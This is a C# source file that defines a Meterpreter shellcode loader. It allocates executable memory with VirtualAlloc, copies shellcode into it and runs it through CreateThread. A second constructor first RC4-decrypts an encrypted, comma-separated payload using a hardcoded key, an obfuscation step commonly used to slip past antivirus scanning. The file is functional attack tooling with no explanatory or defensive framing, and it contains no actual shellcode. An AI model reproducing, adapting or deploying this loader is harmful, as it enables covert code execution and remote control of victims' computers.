using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

public class Meterpreter
{
    private static UInt32 MEM_COMMIT = 0x1000, PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32.dll")]
    private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr handle);
    [DllImport("kernel32.dll")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string moduleName);
    [DllImport("kernel32.dll")]
    private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    private static extern UInt32 LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")]
    private static extern UInt32 GetLastError();

    // Inject Shellcode 
    public Meterpreter(byte[] shellcode)
    {
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;

        // prepare data
        IntPtr pinfo = IntPtr.Zero;

        // execute native code
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    /*Payload_Encrypted = "37,***,1";
     Decrypt and Inject Shellcode Decrypted */
    public Meterpreter(string Payload_Encrypted)
    {
        string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
        byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
        for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
        {
            byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
            _X_to_Bytes[i] = current;
        }
        byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
        byte[] Finall_Payload = Decrypt(KEY, _X_to_Bytes);

        UInt32 funcAddr = VirtualAlloc(0, (UInt32)Finall_Payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(Finall_Payload, 0, (IntPtr)(funcAddr), Finall_Payload.Length);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr pinfo = IntPtr.Zero;

        /// execute native code
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    private static byte[] EncryptInitalize(byte[] key)
    {
        byte[] s = Enumerable.Range(0, 256)
          .Select(i => (byte)i)
          .ToArray();

        for (int i = 0, j = 0; i < 256; i++)
        {
            j = (j + key[i % key.Length] + s[i]) & 255;
            Swap(s, i, j);
        }

        return s;
    }
    private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
    {
        byte[] s = EncryptInitalize(key);

        int i = 0;
        int j = 0;

        return data.Select((b) =>
        {
            i = (i + 1) & 255;
            j = (j + s[i]) & 255;

            Swap(s, i, j);

            return (byte)(b ^ s[(s[i] + s[j]) & 255]);
        });
    }
    private static void Swap(byte[] s, int i, int j)
    {
        byte c = s[i];

        s[i] = s[j];
        s[j] = c;
    }
    public static byte[] Decrypt(byte[] key, byte[] data) { return EncryptOutput(key, data).ToArray(); }
}